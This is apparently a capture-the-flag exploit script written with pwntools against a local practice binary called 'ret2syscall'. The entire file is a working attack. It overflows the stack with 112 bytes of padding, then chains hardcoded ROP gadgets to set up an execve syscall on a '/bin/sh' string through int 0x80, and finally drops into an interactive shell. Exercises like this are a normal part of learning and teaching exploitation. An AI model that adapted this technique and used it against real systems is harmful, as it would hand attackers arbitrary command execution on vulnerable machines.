from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
p = process("./ret2syscall")

if args.G:
    gdb.attach(p)
pop_eax_ret = 0x080bb196
pop_ebx_ret = 0x080481c9
pop_ecx_ebx_ret = 0x0806eb91
pop_edx_ecx_ebx_ret = 0x0806eb90
pop_edx_ret = 0x0806eb6a
int_0x80 = 0x08049421
bin_sh_addr = 0x80be408

p.recvuntil("What do you plan to do?\n")

payload = b"a"*112 + p32(pop_eax_ret) 
payload += p32(0xb) + p32(pop_edx_ecx_ebx_ret) 
payload += p32(0) + p32(0) + p32(bin_sh_addr) 
payload += p32(int_0x80)

p.sendline(payload)
p.interactive()

